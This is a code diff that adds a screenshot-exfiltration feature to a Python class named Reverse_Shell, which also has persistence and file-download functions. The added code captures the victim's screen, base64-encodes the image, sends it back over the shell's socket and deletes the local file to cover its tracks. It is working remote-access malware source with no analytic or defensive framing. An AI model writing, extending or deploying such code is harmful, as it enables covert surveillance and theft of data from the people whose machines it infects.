@@ -7,6 +7,8 @@ import shutil
 import sys
 import base64
 import requests
+import ctypes
+from mss import mss
 
 
 # for persistance:
@@ -39,6 +41,10 @@ class Reverse_Shell:
         file_name = url.split("/")[-1]
         with open(file_name, "wb") as out_file:
             out_file.write(get_reponse.content)
+
+    def screenshot(self):
+        with mss() as screenshot:
+            screenshot.shot()
 
     def initialisation(self):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,6 +89,14 @@ class Reverse_Shell:
                     self.reliable_send("[+] Started")
                 except:
                     self.reliable_send("[-] Failed to start")
+            elif command[:10] == "screenshot":
+                try:
+                    self.screenshot()
+                    with open("monitor-1.png","rb") as screenshot:
+                        self.reliable_send(base64.b64encode(screenshot.read()))
+                    os.remove("monitor-1.png")
+                except:
+                    self.reliable_send("[-] Failed to take screenshot")
             else:
                 try:
                     # creation of the command, see documentation
